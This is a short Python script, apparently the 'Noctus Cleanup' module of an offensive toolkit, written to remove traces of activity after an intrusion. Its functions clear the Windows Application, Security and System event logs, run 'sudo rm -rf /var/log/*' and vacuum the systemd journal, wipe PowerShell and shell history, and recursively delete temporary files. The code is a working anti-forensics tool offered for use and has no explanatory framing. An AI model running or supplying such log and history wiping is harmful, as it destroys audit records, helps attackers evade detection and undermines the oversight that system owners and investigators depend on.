import os
import subprocess
import platform
from colorama import Fore, Style

def clear_logs():
    """Clears system logs to remove traces of activities."""
    print(Fore.YELLOW + "[*] Attempting to clear system logs...")

    try:
        system = platform.system()

        if system == "Windows":
            subprocess.run("wevtutil cl Application", shell=True)
            subprocess.run("wevtutil cl Security", shell=True)
            subprocess.run("wevtutil cl System", shell=True)
            print(Fore.GREEN + "[+] Windows event logs cleared successfully.")

        elif system == "Linux":
            subprocess.run("sudo rm -rf /var/log/*", shell=True)
            subprocess.run("sudo journalctl --rotate --vacuum-time=1s", shell=True)
            print(Fore.GREEN + "[+] Linux logs cleared successfully.")

        else:
            print(Fore.RED + "[-] OS not supported for log clearing.")

    except Exception as e:
        print(Fore.RED + f"[-] Failed to clear logs: {e}")

def remove_command_history():
    """Removes shell command history."""
    print(Fore.YELLOW + "[*] Removing command history...")

    try:
        system = platform.system()

        if system == "Windows":
            os.system("echo off > %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt")
            print(Fore.GREEN + "[+] Windows PowerShell history cleared.")

        elif system == "Linux":
            os.system("history -c && history -w")
            print(Fore.GREEN + "[+] Linux terminal history cleared.")

        else:
            print(Fore.RED + "[-] OS not supported for history clearing.")

    except Exception as e:
        print(Fore.RED + f"[-] Failed to remove history: {e}")

def delete_temp_files():
    """Deletes temporary files that could store traces of activity."""
    print(Fore.YELLOW + "[*] Deleting temporary files...")

    try:
        system = platform.system()

        if system == "Windows":
            subprocess.run("del /f /s /q %temp%\\*", shell=True)
            print(Fore.GREEN + "[+] Windows temporary files deleted.")

        elif system == "Linux":
            subprocess.run("rm -rf /tmp/*", shell=True)
            print(Fore.GREEN + "[+] Linux temporary files deleted.")

        else:
            print(Fore.RED + "[-] OS not supported for temp file deletion.")

    except Exception as e:
        print(Fore.RED + f"[-] Failed to delete temp files: {e}")

def cleanup_system():
    """Runs all cleanup functions to remove traces of activities."""
    print(Fore.CYAN + "[*] Starting Noctus Cleanup...")
    
    clear_logs()
    remove_command_history()
    delete_temp_files()

    print(Fore.GREEN + "[+] Cleanup completed successfully.")

if __name__ == "__main__":
    cleanup_system()
